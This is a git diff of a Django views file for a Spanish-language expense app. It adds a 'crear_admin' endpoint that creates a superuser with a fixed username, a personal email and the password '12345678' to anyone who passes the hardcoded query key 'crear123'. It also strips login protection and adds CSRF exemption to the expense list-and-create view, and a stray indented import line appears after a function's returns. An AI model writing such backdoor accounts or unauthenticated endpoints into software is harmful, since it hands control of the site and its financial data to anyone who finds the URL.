@@ -832,7 +832,38 @@ def reporte_diario_pdf(request):
 
     return response
 
+from django.contrib.auth import get_user_model
+from django.http import HttpResponse
 
+def crear_admin(request):
+    User = get_user_model()
+
+    key = request.GET.get("key")
+
+    if key != "crear123":
+        return HttpResponse("No autorizado", status=403)
+
+    try:
+        user, created = User.objects.get_or_create(
+            username="wiliam",
+            defaults={
+                "email": "jordav8a@gmail.com",
+            }
+        )
+
+        if created:
+            user.set_password("12345678")
+            user.is_superuser = True
+            user.is_staff = True
+            user.save()
+            return HttpResponse("✅ Superusuario creado correctamente")
+
+        return HttpResponse("⚠️ El usuario ya existe")
+
+    except Exception as e:
+        return HttpResponse(f"❌ Error: {str(e)}", status=500)
+    
+    from django.http import JsonResponse
 from django.views.decorators.csrf import csrf_exempt
 from .models import Egreso
 import json
@@ -844,35 +875,53 @@ from django.shortcuts import render
 import json
 from .models import Egreso
 
-from django.contrib.auth.decorators import login_required
-from django.shortcuts import render, redirect
-from .models import Egreso
-
-@login_required
+@csrf_exempt
 def egresos_list_create(request):
 
-    # ───────────── CREAR EGRESO (HTML FORM) ─────────────
-    if request.method == 'POST':
-        nombre = request.POST.get('nombre')
-        descripcion = request.POST.get('descripcion')
-        monto = request.POST.get('monto')
-        metodo_pago = request.POST.get('metodo_pago', 'efectivo')
+    # 🔥 GET → LISTA
+    if request.method == 'GET':
+        egresos = Egreso.objects.all().order_by('-fecha')
 
-        Egreso.objects.create(
-            nombre=nombre,
-            descripcion=descripcion,
-            monto=monto,
-            metodo_pago=metodo_pago
-        )
+        # ✅ SIEMPRE HTML si viene desde navegador (más confiable)
+        if request.headers.get('X-Requested-With') != 'XMLHttpRequest':
+            return render(request, 'egresos/lista.html', {
+                'egresos': egresos
+            })
 
-        return redirect('egresos_list_create')
+        # 🔹 JSON solo para fetch/API
+        data = [
+            {
+                "id": e.id,
+                "nombre": e.nombre,
+                "descripcion": e.descripcion,
+                "monto": float(e.monto),
+                "metodo_pago": e.metodo_pago,
+                "fecha": e.fecha.strftime('%Y-%m-%d %H:%M')
+            }
+            for e in egresos
+        ]
 
-    # ───────────── LISTA (HTML) ─────────────
-    egresos = Egreso.objects.all().order_by('-fecha')
+        return JsonResponse(data, safe=False)
 
-    return render(request, 'egresos/lista.html', {
-        'egresos': egresos
-    })
+    # 🔥 POST → CREAR
+    elif request.method == 'POST':
+        try:
+            body = json.loads(request.body)
+
+            egreso = Egreso.objects.create(
+                nombre=body.get('nombre'),
+                descripcion=body.get('descripcion'),
+                monto=body.get('monto'),
+                metodo_pago=body.get('metodo_pago', 'efectivo')
+            )
+
+            return JsonResponse({
+                "message": "Egreso creado correctamente",
+                "id": egreso.id
+            }, status=201)
+
+        except Exception as e:
+            return JsonResponse({"error": str(e)}, status=400)
 
 @csrf_exempt
 def egreso_detail(request, pk):
